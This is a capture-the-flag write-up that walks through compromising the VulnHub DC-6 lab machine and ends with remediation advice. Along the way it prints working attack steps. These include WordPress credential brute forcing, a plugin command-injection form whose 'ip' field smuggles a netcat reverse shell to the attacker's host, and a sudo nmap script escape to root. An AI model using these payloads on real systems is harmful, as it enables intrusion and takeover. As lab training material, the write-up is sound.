# DC-6 Write-up

> **Platform:** VulnHub, [DC-6](https://www.vulnhub.com/entry/dc-6,315/) **Machine:** DC-6 **Difficulty:** Intermediate **Operating System:** Debian Linux **Author:** Ctum

---

## Overview

DC-6 is a WordPress box built around a specific, provided wordlist hint and a genuine multi-user pivot chain. The official challenge page nudges toward a trimmed-down password list from the start, which turns what could be a slow brute force into a fast one. From there, the path runs through WordPress user and password enumeration, a vulnerable plugin with command injection, a leaked password inside a text file, and finally two separate `sudo` misconfigurations chained together to reach root.

---
## Attack Path

1. Added the target to the hosts file and prepared a trimmed password list per the official hint.
2. Enumerated open services with Nmap.
3. Fingerprinted the site as WordPress and enumerated users and plugins with WPScan.
4. Brute forced WordPress credentials using the provided wordlist.
5. Logged in and found nothing of direct interest in the dashboard.
6. Identified a known command injection vulnerability in an outdated, misconfigured plugin.
7. Used a public exploit to gain a reverse shell as `www-data`.
8. Found a plaintext password inside a user's notes file.
9. Used it to SSH in as a different user, `graham`.
10. Abused a `sudo` rule to pivot to the `jens` account via a backup script.
11. Abused a second `sudo` rule granting NOPASSWD access to `nmap` to escalate to root.
12. Retrieved the final flag.

---
## Preparation

Before scanning, I added the target to my hosts file:

```text
192.168.56.109 wordy
```

The official challenge page also included a direct hint about which wordlist to use, trimming rockyou.txt down to a much smaller, targeted list:

```bash
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
```

This small detail turned what could have been a very slow brute force into a fast one later in the attack chain.

---
## Initial Enumeration

```bash
nmap -p- -sC -sV -T5 wordy
```

```text
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Wordy, Just another WordPress site
|_http-generator: WordPress 5.1.1
```

SSH and a WordPress site running version 5.1.1, an outdated release by the time of testing.

---
## WordPress Enumeration

```bash
wpscan --url http://wordy -e vt,ap,u
```

The scan confirmed WordPress 5.1.1 on the theme "Twenty Seventeen," and enumerated four installed plugins, including one worth noting immediately: **plainview-activity-monitor**, flagged as several years out of date with **directory listing enabled**, a combination that usually points toward a known, exploitable vulnerability.

User enumeration returned five accounts:

```text
admin
jens
graham
sarah
mark
```

---
## Cracking WordPress Credentials

With a user list and the trimmed password list ready, I ran a credential attack through WPScan.

```bash
wpscan --url http://wordy --passwords passwords.txt --usernames wordy-users
```

```text
Valid Combinations Found:
Username: mark, Password: helpdesk01
```

Logging in with these credentials didn't reveal anything immediately useful inside the WordPress dashboard, so I turned to the outdated plugin flagged earlier.

---
## Exploiting the Vulnerable Plugin

```bash
searchsploit activity monitor
```

This returned a matching exploit involving command injection.

```bash
searchsploit -m php/webapps/45274.html
```

The exploit is a local HTML form that submits a POST request directly to the plugin's tools page, using an `ip` field to smuggle a shell command:

```html
<form action="http://wordy:80/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools"
      method="POST" enctype="multipart/form-data">
  <input type="hidden" name="ip" value="google.fr| nc 192.168.56.1 3333 -e /bin/bash" />
```

I edited the file to point at the correct host and port, and adjusted the netcat command to connect back to my listener rather than bind locally.

I started a listener:

```bash
nc -nlvp 3333
```

Then opened the modified HTML file and submitted the form. The listener caught a connection immediately, giving me a shell as `www-data`.

---
## Stabilizing the Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Followed by backgrounding the process and resetting the terminal for a fully interactive shell:

```bash
Ctrl+Z
stty raw -echo; fg; reset
```

---
## Finding a Leaked Password

Exploring `mark`'s home directory turned up a notes file:

```bash
cat /home/mark/stuff/things-to-do.txt
```

```text
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement
```

Tucked inside an ordinary to-do list was a plaintext password for `graham`. Since it wasn't a match for any WordPress login already tried, this was worth testing against SSH instead.

---
## Pivoting via SSH

```bash
ssh graham@wordy
```

The password worked. Checking what `graham` could run with elevated privileges:

```bash
sudo -l
```

```text
User graham may run the following commands on dc-6:
   (jens) NOPASSWD: /home/jens/backups.sh
```

`graham` could run a backup script as `jens`, without a password.

---
## Pivoting to Jens

Reading `backups.sh` showed a `tar` command wrapped around a commented-out section. By removing the tar logic and leaving only an uncommented `/bin/bash` line, running the script would drop into a shell as `jens` instead of performing its intended backup task.

```bash
sudo -u jens ./backups.sh
```

This produced an interactive shell running as `jens`.

---
## Privilege Escalation to Root

Checking `sudo -l` again, this time as `jens`:

```bash
sudo -l
```

```text
User jens may run the following commands on dc-6:
   (root) NOPASSWD: /usr/bin/nmap
```

`nmap` with NOPASSWD root access is a well-known escalation path, since older versions support an interactive scripting engine that can execute arbitrary commands. The standard GTFOBins technique didn't work directly in this case, but an alternative approach using nmap's scripting engine did:

```bash
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

This dropped straight into a root shell. I upgraded it to a proper interactive shell as before:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---
## Final Flag

```bash
cat /root/theflag.txt
```

```text
Congratulations!!!

Hope you enjoyed DC-6. Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```

Machine complete.

---
## Flags Summary

|Flag|Location|How It Was Found|
|---|---|---|
|Final|`/root/theflag.txt`|Retrieved after chaining two sudo misconfigurations (graham to jens to root)|

DC-6 only contains a single flag, located in `/root` after full compromise.

---
## Remediation

- **Keep WordPress core, themes, and plugins updated.** Both the WordPress version and the vulnerable activity monitor plugin were significantly out of date, and the plugin's command injection flaw was the direct entry point.
- **Disable directory listing** on plugin and upload directories. It made confirming the outdated plugin version trivial.
- **Enforce strong, unique passwords for WordPress accounts.** `mark`'s password was recoverable from a modestly sized wordlist.
- **Never store plaintext credentials in personal notes or to-do files**, even informally. Graham's password sitting in a plain text file handed over SSH access outright.
- **Audit `sudoers` entries for any chained privilege paths.** Both `graham` to `jens` and `jens` to `root` were individually narrow-looking rules that combined into a full compromise.
- **Never grant NOPASSWD sudo access to `nmap`, or any binary with a scripting or interactive engine**, without fully understanding its escape potential. Reference GTFOBins before adding any binary to a sudoers file.

---
## Lessons Learned

- Official challenge hints (like the trimmed wordlist here) are worth following closely. They usually exist to keep a specific step from becoming an unreasonably long brute force.
- Outdated, rarely-updated plugins with directory listing enabled are a strong signal to check Exploit-DB immediately.
- Personal notes and to-do files are a surprisingly common place to find leaked credentials, since people tend to treat them as private rather than sensitive.
- Privilege escalation chains are sometimes built from multiple small, individually reasonable-looking `sudo` rules. Each one should be evaluated on its own, and also as part of a larger potential chain.
- Not every documented GTFOBins technique works identically across versions. Having a backup method (in this case, from external research rather than GTFOBins directly) is worth keeping in mind.

---
## Tools Used

- Nmap
- WPScan
- Searchsploit
- Netcat
- SSH

---
## Technologies Encountered

- WordPress 5.1.1
- Apache
- OpenSSH
- Debian Linux

---
## Skills Practiced

- Network Enumeration
- WordPress User and Plugin Enumeration
- Credential Attacks
- Plugin Command Injection Exploitation
- Reverse Shell Handling
- Multi-User Privilege Pivoting
- Sudo Misconfiguration Exploitation